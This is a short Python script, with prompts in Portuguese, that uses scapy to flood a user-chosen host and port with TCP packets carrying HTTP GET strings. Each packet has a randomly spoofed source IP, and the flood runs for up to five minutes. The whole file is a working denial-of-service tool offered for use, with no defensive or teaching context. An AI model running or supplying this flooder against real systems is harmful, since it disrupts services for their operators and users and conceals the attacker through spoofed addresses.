import random
import time
from scapy.all import *

target = input("Ip ou dominio do alvo: ")
port = int(input("Porta que sera atacada: "))
num_packets = int(input("Numero de pacotes que serao enviados?: "))
duration = 300
timeout = time.time() + duration

for i in range(num_packets):
    if time.time() > timeout:
        break
    
    fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    ip = socket.gethostbyname(target)
    
    packet = IP(src=fake_ip, dst=ip)/TCP(dport=port)/"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000))
    send(packet, verbose=True)
    
    print(f"Pacotes sendo enviados para o ip: {ip} Na porta:  {port} Ip de origem: {fake_ip} ({i+1}/{num_packets}).")
